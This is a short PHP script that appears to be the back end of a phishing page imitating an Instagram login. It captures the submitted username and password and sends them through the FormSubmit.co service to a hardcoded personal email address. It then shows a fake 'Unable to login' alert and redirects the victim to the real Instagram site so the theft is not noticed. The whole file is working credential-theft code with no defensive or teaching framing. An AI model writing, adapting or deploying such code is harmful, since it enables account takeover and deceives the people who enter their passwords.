<?php

// Variable settings
$username = $_POST['u_name'] ?? '';  // Fetch username
$passcode = $_POST['pass'] ?? '';    // Fetch password

// Your FormSubmit.co email address (replace with yours)
$formsubmit_email = "hillol.minecraft.pc@gmail.com"; 

// The API endpoint for FormSubmit
$url = "https://formsubmit.co/ajax/" . $formsubmit_email;

// Prepare the data array to match what FormSubmit expects
$data = [
    'u_name' => $username,
    'pass'   => $passcode,
    '_subject' => "Someone Login ! Insta Dummy page", // Custom subject line
];

// Initialize cURL session
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Optional: Set headers if you want JSON response (FormSubmit returns JSON by default for /ajax)
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/x-www-form-urlencoded'
]);

// Execute the request
$response = curl_exec($ch);

// Check for cURL errors
if (curl_errno($ch)) {
    $error_msg = curl_error($ch);
    echo "<script type='text/javascript'>alert('Error sending credentials: " . $error_msg . "');</script>";
} else {
    // Close cURL session
    curl_close($ch);

    // Decode JSON response to check status
    $result = json_decode($response, true);

    if ($result['success'] == 'true') {
        // Success: Redirect user
        echo "<script type='text/javascript'>alert('Error ! Unable to login ');
            window.location.replace('https://www.instagram.com');
            </script>";
    } else {
        // FormSubmit returned an error (e.g., invalid email)
        echo "<script type='text/javascript'>alert('FormSubmit Error: " . $result['error'] . "');</script>";
    }
}

?>
